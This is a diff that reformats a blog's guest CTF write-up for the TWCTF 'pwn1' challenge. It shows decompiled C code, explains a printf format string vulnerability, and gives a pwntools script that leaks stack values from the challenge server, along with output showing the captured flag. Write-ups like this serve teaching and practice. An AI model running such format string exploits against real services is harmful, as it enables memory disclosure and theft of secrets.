@@ -23,16 +23,20 @@ Guest post by Shak.
 
 * * *
 
-<pre class="theme:plain-white striped:true lang:sh decode:true">[Megabeets]$ nc pwn1.chal.ctf.westerns.tokyo 31729
+```sh
+[Megabeets]$ nc pwn1.chal.ctf.westerns.tokyo 31729
 Flag judgment system
 Input flag &gt;&gt; FLAG
 FLAG
 Wrong flag...
-</pre>
+
+```
+
 
 <span style="font-weight: 400;">Let’s check the binary. The following function is reading the flag from a local file on the server, so this binary will not reveal the flag, but further examining it might.</span>
 
-<pre class="toolbar:1 lang:c decode:true " title="From Hex-Rays Decompiler">int __cdecl load_flag(char *filename, char *s, int n)
+```c
+int __cdecl load_flag(char *filename, char *s, int n)
 {
   int result; // eax@2
   FILE *stream; // [sp+18h] [bp-10h]@1
@@ -51,11 +55,14 @@ Wrong flag...
   else { result = 0; }
   return result;
 }
-</pre>
+
+```
+
 
 <span style="font-weight: 400;">Next we can see the main function which gets our input and compares it to the flag. </span>
 
-<pre class="toolbar:1 lang:c decode:true " title="From Hex-Rays Decompiler">int __cdecl main(int argc, const char **argv, const char **envp)
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
 {
   void *v3; // esp@1
   int result; // eax@2
@@ -82,18 +89,24 @@ Wrong flag...
   v5 = *MK_FP(__GS__, 20) ^ v7;
   return result;
 }
-</pre>
+
+```
+
 
 <span style="font-weight: 400;">What it also does, is printing our input with no formatting (line 15), which means we can use <em>printf</em> format to read data from the stack. First of all, let’s check if this will work by trying to print the second value from the stack as a string</span>
 
-<pre class="theme:plain-white lang:sh decode:true">Flag judgment system
+```sh
+Flag judgment system
 Input flag &gt;&gt; %2$s
 פJr≈
-Wrong flag…</pre>
+Wrong flag…
+```
+
 
 <span style="font-weight: 400;">It works, but no luck there. I wrote a simple python script that will print the first 300 values from the stack and search for the flag:</span>
 
-<pre class="lang:python decode:true ">#!/usr/bin/python
+```python
+#!/usr/bin/python
 
 from pwn import *
 
@@ -108,11 +121,14 @@ for i in xrange(1,300):
                         break
         except:
                 pass
-        r.close()</pre>
+        r.close()
+```
+
 
 <span style="font-weight: 400;">And indeed we get it:</span>
 
-<pre class="theme:plain-white lang:sh mark:8 decode:true ">[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 31729: Done
+```sh
+[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 31729: Done
 [*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 31729
 [+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 31729: Done
 .
@@ -121,7 +137,9 @@ for i in xrange(1,300):
 [+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 31729: Done
 The flag is: TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}
 Wrong flag...
-</pre>
+
+```
+
 
 <div class="nf-post-footer">
   <p style="text-align: right">
